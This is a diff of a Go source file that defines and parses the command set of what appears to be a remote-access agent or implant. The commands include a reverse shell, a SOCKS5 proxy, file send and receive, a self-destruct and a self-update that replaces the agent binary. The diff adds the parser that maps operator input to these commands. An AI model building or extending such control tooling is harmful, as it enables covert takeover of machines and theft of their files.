@@ -1,5 +1,10 @@
 package commands
 
+import (
+	"errors"
+	"strings"
+)
+
 type Command uint8
 
 const (
@@ -19,38 +24,54 @@ const (
 	// Replaces the agent with a new binary and restarts it
 	UpdateBinary
 
-	NoOp // Marks the end of the command list
+	Exit // Marks the end of the command list
 )
 
-func CommandList() (cmds []Command) {
-	cmds = make([]Command, NoOp-1)
-	for i := Socks5; i < int(NoOp); i++ {
-		cmds[i-1] = Command(i)
-	}
-	return
+type CommandStruct struct {
+	Command   Command
+	Arguments []string
 }
 
-func (c Command) String() string {
-	switch c {
-	case Socks5:
-		return "Socks5"
-	case ShellTCP:
-		return "Reverse shell"
-	case SelfDestruct:
-		return "SelfDestruct"
-	case SendFile:
-		return "SendFile"
-	case ReceiveFile:
-		return "ReceiveFile"
-	case UpdateID:
-		return "Update server device ID"
-	case UpdateBinary:
-		return "UpdateBinary"
+func ParseCommand(line string) (*CommandStruct, error) {
+	cs := CommandStruct{}
+	// Split by space
+	arg := strings.Split(line, " ")
+	if len(arg) < 1 {
+		return nil, errors.New("empty string")
+	}
+	switch arg[0] {
+	case "socks":
+		cs.Command = Socks5
+	case "sh":
+		cs.Command = ShellTCP
+	case "kill":
+		cs.Command = SelfDestruct
+	case "send":
+		cs.Command = SendFile
+		if len(arg) != 3 {
+			return nil, errors.New("send: <local> <remote>")
+		}
+		cs.Arguments = append(cs.Arguments, arg[1], arg[2])
+	case "recv":
+		cs.Command = ReceiveFile
+		if len(arg) != 3 {
+			return nil, errors.New("recv: <remote> <local>")
+		}
+		cs.Arguments = append(cs.Arguments, arg[1], arg[2])
+	case "updateid":
+		cs.Command = UpdateID
+		if len(arg) != 2 {
+			return nil, errors.New("updateid: <newid>")
+		}
+		cs.Arguments = append(cs.Arguments, arg[1])
+	case "update":
+		cs.Command = UpdateBinary
+		if len(arg) != 2 {
+			return nil, errors.New("update: <local>")
+		}
+		cs.Arguments = append(cs.Arguments, arg[1])
 	default:
-		return "Unknown"
+		return nil, errors.New("unknown command")
 	}
-}
-
-func (c Command) Value() any {
-	return c
+	return &cs, nil
 }
